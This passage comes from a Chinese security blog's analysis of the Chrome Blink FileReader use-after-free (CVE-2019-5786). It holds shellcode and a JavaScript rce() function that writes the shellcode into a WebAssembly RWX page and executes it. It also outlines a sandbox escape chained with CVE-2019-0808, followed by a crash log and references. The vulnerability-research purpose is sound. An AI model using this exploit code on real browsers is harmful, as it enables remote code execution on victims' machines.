class="string">&quot;%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u652e%u6578%u4100&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rce</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_wasm_func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> importObject = &#123;</span><br><span class="line">            <span class="attr">imports</span>: &#123; <span class="attr">imported_func</span>: <span class="function"><span class="params">arg</span> =&gt;</span> <span class="built_in">console</span>.log(arg) &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        bc = [<span class="number">0x0</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6d</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x8</span>, <span class="number">0x2</span>, <span class="number">0x60</span>, <span class="number">0x1</span>, <span class="number">0x7f</span>, <span class="number">0x0</span>, <span class="number">0x60</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x19</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x73</span>, <span class="number">0xd</span>, <span class="number">0x69</span>, <span class="number">0x6d</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x11</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x65</span>, <span class="number">0x78</span>, <span class="number">0x70</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x5f</span>, <span class="number">0x66</span>, <span class="number">0x75</span>, <span class="number">0x6e</span>, <span class="number">0x63</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xa</span>, <span class="number">0x8</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x41</span>, <span class="number">0x2a</span>, <span class="number">0x10</span>, <span class="number">0x0</span>, <span class="number">0xb</span>];</span><br><span class="line">        wasm_code = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(bc);</span><br><span class="line">        wasm_mod = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasm_code), importObject);</span><br><span class="line">        <span class="keyword">return</span> wasm_mod.exports.exported_func;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> wasm_func = get_wasm_func();</span><br><span class="line">    wfunc = wasm_func;</span><br><span class="line">    <span class="comment">// traverse the JSFunction object chain to find the RWX WebAssembly code page</span></span><br><span class="line">    <span class="keyword">let</span> wasm_func_addr = addrof(wasm_func) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> sfi = read4(wasm_func_addr + <span class="number">12</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> WasmExportedFunctionData = read4(sfi + <span class="number">4</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> instance = read4(WasmExportedFunctionData + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> rwx_addr = read4(instance + <span class="number">0x74</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向RWX内存页中写入shellcode</span></span><br><span class="line">    <span class="keyword">if</span> (meterpreter.length % <span class="number">2</span> != <span class="number">0</span>)</span><br><span class="line">        meterpreter += <span class="string">&quot;\\u9090&quot;</span>;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; meterpreter.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">        write4(rwx_addr + i*<span class="number">2</span>, meterpreter.charCodeAt(i) + meterpreter.charCodeAt(i + <span class="number">1</span>) * <span class="number">0x10000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 到了这步证明攻击已经成功了</span></span><br><span class="line">    <span class="built_in">window</span>.top.postMessage(<span class="string">&#x27;SUCCESS&#x27;</span>, <span class="string">&#x27;*&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用shellcode</span></span><br><span class="line">    <span class="built_in">window</span>.setTimeout(wfunc, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>blink的漏洞利用相对于v8的类型混淆来说看起来好像更复杂一些，需要的操作也要更麻烦一些，但是利用的核心思想仍然是类型混淆造成任意地址读写，并通过WebAssembly技术进行rce。</p>
<p>该漏洞利用程序开发的难点在于调试环境的获取，由于某些已知原因，国内的chromium源码编译环境异常难以搭建，只能通过符号服务器或者符号文件+二进制程序进行二进制层面的调试，这样就对exp的调试造成了比较大的阻碍。</p>
<h4 id="（5）简述CVE-2019-0808与沙箱逃逸"><a href="#（5）简述CVE-2019-0808与沙箱逃逸" class="headerlink" title="（5）简述CVE-2019-0808与沙箱逃逸"></a>（5）简述CVE-2019-0808与沙箱逃逸</h4><p>本节内容参考[16]，[17]</p>
<p>我们知道，Chrome基于多进程架构，主要包括浏览器进程和渲染进程，进程间通过IPC通信（Mojo）</p>
<p>其中渲染进程运行着不可信的HTML和JS代码，浏览器中的每一个tab为一个独立的进程，运行在Untrusted的低权限等级，并通过沙箱引擎隔离。因此像CVE-2019-5768这样的渲染进程中的远程代码执行漏洞仍需要结合其他高权限漏洞实现沙箱逃逸。一般来说有几种思路：1）利用浏览器进程的漏洞，比如IndexedDB，Mojo等； 2）利用操作系统内核漏洞，比如与CVE-2019-5768组合的win32k.sys内核提权漏洞CVE-2019-0808。</p>
<p>CVE-2019-0808是win32k.sys中的一个空指针解引用漏洞。由于代码未对返回窗口指针的类型进行检查，导致程序可以进行空指针解引用，由于win8以上的windows无法在零页分配内存，所以该漏洞的危害性相对较低，不过仍然可以配合CVE-2019-5786达到杀向逃逸的目的。</p>
<p>简单描述一下CVE-2019-0808的漏洞原理，xxxMNFindWindowFromPoint函数通过xxxSendMessage获取pPopupMenu，之后并未对pPopupMenu做任何校验，攻击者通过SetWinEventHook获取该事件伪造NULL指针赋值给pPopupMenu-&gt;spmenu并返回给内核，触发漏洞。</p>
<p>在完成了内核提权exp后，接下来需要考虑如何结合Chrome渲染进程的漏洞实现沙箱逃逸。首先可以考虑将内核提权exp以dll的形式编译，然后加载到目标进程，执行提权操作。但是由于Chrome渲染进程运行在Untrusted权限，无法直接利用漏洞获取shellcode执行权限后注入提权dll，需要考虑其他方法。</p>
<p>反射型dll注入就是一个比较好的方法，github中有相关项目可以直接使用[18]：</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210531200032149.png" alt="image-20210531200032149"></p>
<p>该利用链参考[19]，实测发现个人机器在关闭沙箱时可以执行shellcode弹出system的cmd，但是在开启沙箱的时候会造成下述状况：</p>
<p><img src="/2021/05/31/CVE-2019-5786/image-20210531202300623.png" alt="image-20210531202300623"></p>
<p>crash log如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">VIRTUAL_MACHINE:  VMware</span><br><span class="line"></span><br><span class="line">BUGCHECK_CODE:  1</span><br><span class="line"></span><br><span class="line">BUGCHECK_P1: 114d</span><br><span class="line"></span><br><span class="line">BUGCHECK_P2: 0</span><br><span class="line"></span><br><span class="line">BUGCHECK_P3: ffff</span><br><span class="line"></span><br><span class="line">BUGCHECK_P4: 0</span><br><span class="line"></span><br><span class="line">CUSTOMER_CRASH_COUNT:  1</span><br><span class="line"></span><br><span class="line">PROCESS_NAME:  chrome.exe</span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">    &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;</span><br><span class="line">8ade0c34 779270b4 (T) badb0d00 8ade0b00 00000000 nt!KiServiceExit2+0x17a</span><br><span class="line">WARNING: Frame IP not in any known module. Following frames may be wrong.</span><br><span class="line">    &lt;Intermediate frames may have been skipped due to lack of complete unwind&gt;</span><br><span class="line">8ade0b34 00000000 (T) 00000000 00000000 00000000 0x779270b4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  nt!KiServiceExit2+17a</span><br><span class="line"></span><br><span class="line">MODULE_NAME: nt</span><br><span class="line"></span><br><span class="line">IMAGE_NAME:  ntkrpamp.exe</span><br><span class="line"></span><br><span class="line">IMAGE_VERSION:  6.1.7601.17514</span><br><span class="line"></span><br><span class="line">STACK_COMMAND:  .thread ; .cxr ; kb</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  0x1_SysCallNum_11ea_nt!KiServiceExit2+17a</span><br><span class="line"></span><br><span class="line">OS_VERSION:  7.1.7601.17514</span><br><span class="line"></span><br><span class="line">BUILDLAB_STR:  win7sp1_rtm</span><br><span class="line"></span><br><span class="line">OSPLATFORM_TYPE:  x86</span><br><span class="line"></span><br><span class="line">OSNAME:  Windows 7</span><br><span class="line"></span><br><span class="line">FAILURE_ID_HASH:  &#123;8f36ef45-2344-18c7-dc3e-a379cfe2ebc4&#125;</span><br><span class="line"></span><br><span class="line">Followup:     MachineOwner</span><br><span class="line">---------</span><br></pre></td></tr></table></figure>

<h2 id="四、总结与思考"><a href="#四、总结与思考" class="headerlink" title="四、总结与思考"></a>四、总结与思考</h2><p>该漏洞为blink相关的逻辑漏洞，由于异步的特性导致代码逻辑出现问题，最终生成了两个指向同一内存的指针，该漏洞的质量很高，在被曝出时就被发现与CVE-2019-0808配合绕过沙箱实现RCE，是一个比较值得研究的blink漏洞。</p>
<h2 id="五、参考"><a href="#五、参考" class="headerlink" title="五、参考"></a>五、参考</h2><p>[1] <a class="link"   target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader" >https://developer.mozilla.org/zh-CN/docs/Web/API/FileReader<i class="fas fa-external-link-alt"></i></a></p>
<p>[2] <a class="link"   target="_blank" rel="noopener" href="https://www.chromium.org/developers/how-tos/debugging-on-windows/windbg-help" >https://www.chromium.org/developers/how-tos/debugging-on-windows/windbg-help<i class="fas fa-external-link-alt"></i></a></p>
<p>[3] <a class="link"   target="_blank" rel="noopener" href="https://www.chromium.org/getting-involved/download-chromium" >https://www.chromium.org/getting-involved/download-chromium<i class="fas fa-external-link-alt"></i></a></p>
<p>[4] <a class="link"   target="_blank" rel="noopener" href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/612429/" >https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win_x64/612429/<i class="fas fa-external-link-alt"></i></a></p>
<p>[5] <a class="link"   target="_blank" rel="noopener" href="https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/612432/" >https://commondatastorage.googleapis.com/chromium-browser-snapshots/index.html?prefix=Win/612432/<i class="fas fa-external-link-alt"></i></a></p>
<p>[6] <a class="link"   target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2018/07/web-worker.html" >http://www.ruanyifeng.com/blog/2018/07/web-worker.html<i class="fas fa-external-link-alt"></i></a></p>
<p>[7] <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/SZxiaochun/p/8017475.html" >https://www.cnblogs.com/SZxiaochun/p/8017475.html<i class="fas fa-external-link-alt"></i></a></p>
<p>[8] <a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/yoyo-sincerely/p/8658075.html" >https://www.cnblogs.com/yoyo-sincerely/p/8658075.html<i class="fas fa-external-link-alt"></i></a></p>
<p>[9] <a class="link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/94588204" >https://zhuanlan.zhihu.com/p/94588204<i class="fas fa-external-link-alt"></i></a></p>
<p>[10] <a class="link"   target="_blank" rel="noopener" href="https://www.jianshu.com/p/c2cd6c7e1976" >https://www.jianshu.com/p/c2cd6c7e1976<i class="fas fa-external-link-alt"></i></a></p>
<p>[11] <a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/194351" >https://www.anquanke.com/post/id/194351<i class="fas fa-external-link-alt"></i></a></p>
<p>[12] <a class="link"   target="_blank" rel="noopener" href="https://www.4hou.com/posts/7OYQ" >https://www.4hou.com/posts/7OYQ<i class="fas fa-external-link-alt"></i></a></p>
<p>[13] <a class="link"   target="_blank" rel="noopener" href="https://github.com/exodusintel/CVE-2019-5786/" >https://github.com/exodusintel/CVE-2019-5786/<i class="fas fa-external-link-alt"></i></a></p>
<p>[14] <a class="link"   target="_blank" rel="noopener" href="https://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/" >https://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/<i class="fas fa-external-link-alt"></i></a></p>
<p>[15] <a class="link"   target="_blank" rel="noopener" href="https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/" >https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/<i class="fas fa-external-link-alt"></i></a></p>
<p>[16] <a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197892" >https://www.anquanke.com/post/id/197892<i class="fas fa-external-link-alt"></i></a></p>
<p>[17] <a class="link"   target="_blank" rel="noopener" href="https://blogs.360.cn/post/RootCause_CVE-2019-0808_CH.html" >https://blogs.360.cn/post/RootCause_CVE-2019-0808_CH.html<i class="fas fa-external-link-alt"></i></a></p>
<p>[18] <a class="link"   target="_blank" rel="noopener" href="https://github.com/monoxgas/sRDI" >https://github.com/monoxgas/sRDI<i class="fas fa-external-link-alt"></i></a></p>
<p>[19] <a class="link"   target="_blank" rel="noopener" href="https://github.com/exodusintel/CVE-2019-0808" >https://github.com/exodusintel/CVE-2019-0808<i class="fas fa-external-link-alt"></i></a></p>

        </div>

        

        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2021/12/09/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">垃圾回收算法与实现</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2021/05/12/CVE-2021-21224/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">CVE-2021-21224</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
            <div class="comment-container">
                <div class="comments-container">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fas fa-comments">&nbsp;Comments</i>
    </div>
    

        
            
    <div class="valine-container">
        <script 
                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
        <div id="vcomments"></div>
        <script >
            function loadValine() {
                new Valine({
                    el: '#vcomments',
                    appId: 'oP8c99sduOuJjyeVoKafuweh-gzGzoHsz',
                    appKey: 'TwXXvHbKxF0DVsXV22S2uRVG',
                    meta: ['nick', 'mail', 'link'],
                    avatar: 'wavatar',
                    enableQQ: true,
                    placeholder: '欢迎大家吐槽~',
                    lang: 'en'.toLowerCase()
                });

                function getAuthor(language) {
                    switch (language) {
                        case 'en':
                            return 'Author';
                        case 'zh-CN':
                            return '博主';
                        default:
                            return 'Master';
                    }
                }

                // Add "Author" identify
                const getValineDomTimer = setInterval(() => {
                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
                    if (vcards.length > 0) {
                        let author = 'fa1lr4in';

                        if (author) {
                            for (let vcard of vcards) {
                                const vnick_dom = vcard.querySelector('.vhead .vnick');
                                const vnick = vnick_dom.innerHTML;
                                if (vnick === author) {
                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
                                }
                            }
                        }
                        clearInterval(getValineDomTimer);
                    } else {
                        clearInterval(getValineDomTimer);
                    }
                }, 2000);
            }

            if ('false') {
                const loadValineTimeout = setTimeout(() => {
                    loadValine();
                    clearTimeout(loadValineTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadValine);
            }
        </script>
    </div>



        
    
</div>

            </div>
        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">fa1lr4in</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fas fa-comment"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        
            <li class="tools-item rss flex-center">
                <a class="flex-center"
                   href="/atom.xml"
                   target="_blank"
                >
                    <i class="fas fa-rss"></i>
                </a>
            </li>
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Blink-FileReader-UAF%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-5786%EF%BC%89"><span class="nav-text">Blink FileReader UAF漏洞（CVE-2019-5786）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="nav-text">一、漏洞信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0"><span class="nav-text">1、漏洞简述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E7%BB%84%E4%BB%B6%E5%92%8C%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="nav-text">2、组件和漏洞概述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5"><span class="nav-text">3、相关链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-text">4、解决方案</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">二、漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">1、环境搭建</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="nav-text">2、复现过程</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89msf%E5%A4%8D%E7%8E%B0"><span class="nav-text">（1）msf复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89github%E5%85%AC%E5%BC%80exp%E5%A4%8D%E7%8E%B0"><span class="nav-text">（2）github公开exp复现</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">三、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">1、基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="nav-text">2、背景知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%880%EF%BC%89FileReader%E5%AF%B9%E8%B1%A1"><span class="nav-text">（0）FileReader对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89Chrome%E8%B0%83%E8%AF%95%E6%96%B9%E5%BC%8F"><span class="nav-text">（1）Chrome调试方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E7%AC%A6%E5%8F%B7%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A5%E5%8F%8A%E7%AC%A6%E5%8F%B7%E6%96%87%E4%BB%B6%E9%85%8D%E7%BD%AE"><span class="nav-text">（2）符号服务器以及符号文件配置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E4%BB%A3%E7%A0%81%E6%9F%A5%E7%9C%8B%E5%B7%A5%E5%85%B7sourcegraph"><span class="nav-text">（3）代码查看工具sourcegraph</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89Web-Worker"><span class="nav-text">（4）Web Worker</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%885%EF%BC%89std-move"><span class="nav-text">（5）std::move</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%886%EF%BC%89ArrayBuffer-Neutering"><span class="nav-text">（6）ArrayBuffer Neutering</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E8%A1%A5%E4%B8%81%E6%AF%94%E8%BE%83"><span class="nav-text">3、补丁比较</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-text">4、漏洞分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="nav-text">（1）静态分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-text">（2）动态调试</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E8%A7%A6%E5%8F%91%E7%9B%B8%E5%85%B3%E5%87%BD%E6%95%B0"><span class="nav-text">（1）触发相关函数</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E7%AE%80%E5%8D%95%E6%A2%B3%E7%90%86"><span class="nav-text">（2）简单梳理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89POC%E5%88%86%E6%9E%90"><span class="nav-text">（3）POC分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%884%EF%BC%89exp%E5%88%86%E6%9E%90"><span class="nav-text">（4）exp分析</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E5%88%86%E9%85%8D128Mib%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">（1）分配128Mib字符串</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%882%EF%BC%89-%E5%A0%86%E5%B8%83%E5%B1%80"><span class="nav-text">（2） 堆布局</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E8%8E%B7%E5%8F%96%E8%A7%A6%E5%8F%91UAF%E7%9A%84%E4%B8%A4%E4%B8%AA%E6%8C%87%E9%92%88"><span class="nav-text">（3）获取触发UAF的两个指针</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%884%EF%BC%89%E8%A7%A6%E5%8F%91%E6%BC%8F%E6%B4%9E"><span class="nav-text">（4）触发漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E5%87%86%E5%A4%87%EF%BC%8C%E7%9B%B8%E5%AF%B9%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-text">（5）类型混淆准备，相对地址读写</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%886%EF%BC%89%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99"><span class="nav-text">（6）任意地址读写</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%EF%BC%887%EF%BC%89%E5%88%A9%E7%94%A8WebAssembly%E6%8A%80%E6%9C%AF%E7%94%B3%E8%AF%B7RWX%E7%A9%BA%E9%97%B4%EF%BC%8C%E6%9B%BF%E6%8D%A2shellcode%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="nav-text">（7）利用WebAssembly技术申请RWX空间，替换shellcode并执行</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%885%EF%BC%89%E7%AE%80%E8%BF%B0CVE-2019-0808%E4%B8%8E%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span 